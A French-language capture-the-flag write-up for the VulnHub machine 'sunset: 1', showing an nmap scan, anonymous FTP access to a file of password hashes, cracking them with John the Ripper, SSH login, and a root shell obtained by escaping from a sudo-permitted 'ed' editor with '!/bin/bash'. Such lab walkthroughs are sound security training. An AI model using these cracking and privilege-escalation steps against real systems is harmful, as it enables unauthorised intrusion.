---
title: "Solution du CTF Sunset: 1 de VulnHub"
tags: [VulnHub, CTF]
---

[whitecr0wz](https://whitecr0wz.github.io/) est en auteur prolifique de CTF pourtant, c'est la première fois que je me lance sur l'une de ces créations, ici avec le CTF [sunset: 1](https://vulnhub.com/entry/sunset-1,339/)

Première surprise sur ce CTF, seulement deux ports : FTP et SSH.

```
Nmap scan report for 192.168.56.153
Host is up (0.00021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.5
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|_      PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
```

Le serveur FTP autorise les connexions anonyme et livre aussi un fichier `backup` dans lequel on trouve des hashes :

```
CREDENTIALS:                                                                                                                                                                                                       
office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  
datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              
sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                                     
sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/
```

`JtR` n'a pas eu de mal à les casser :

```console
john --wordlist=rockyou.txt hashes.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 5 password hashes with 2 different salts (2.5x same-salt boost) (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
space            (space)     
cheer14          (sunset)     
sky              (sky)
```

Le password pour le compte `sunset` fonctionne sur le SSH :

```console
sunset@sunset:~$ cat user.txt 
5b5b8e9b01ef27a1cc0a2d5fa87d7190
```

On peut profiter d'une entrée `sudo` pour s'échapper de l'éditeur `ed` avec la commande `!/bin/bash` :

```console
sunset@sunset:~$ sudo -l
Matching Defaults entries for sunset on sunset:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
sunset@sunset:~$ sudo /usr/bin/ed
!/bin/bash
root@sunset:/home/sunset# id
uid=0(root) gid=0(root) groups=0(root)
root@sunset:/home/sunset# cd /root
root@sunset:~# ls
flag.txt  ftp  server.sh
root@sunset:~# cat flag.txt
25d7ce0ee3cbf71efbac61f85d0c14fe
```

EZ-PZ
